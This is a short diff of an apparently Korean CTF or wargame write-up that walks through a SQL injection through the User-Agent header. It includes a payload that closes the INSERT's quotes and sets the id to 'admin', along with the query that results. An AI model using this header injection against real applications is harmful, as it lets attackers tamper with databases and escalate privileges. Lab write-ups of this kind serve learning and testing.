@@ -23,18 +23,18 @@
             "server" -> step1 -> step3 -> step5;
         }
         step0 -> step1[label="User-Agent: joizel','2.2.2.2','admin');#",arrowhead="normal"];
-        step3 -> step2[label="@solve",arrowhead="normal"];
+        step3 -> step2[label="insert into lv0(agent,ip,id) values('joizel','2.2.2.2','admin');#','$ip','guest')",arrowhead="normal"];
     }
 
 |
 
 
-Source analysis
+소스 분석
 ================================================================================================================
 
-입력 부분: $_SERVER[HTTP_USER_AGENT], getenv("HTTP_USER_AGENT")
-
-출력 부분: @solve();
+- GET 파라미터: HTTP_USER_AGENT
+- String
+- insert
 
 .. code-block:: php
 
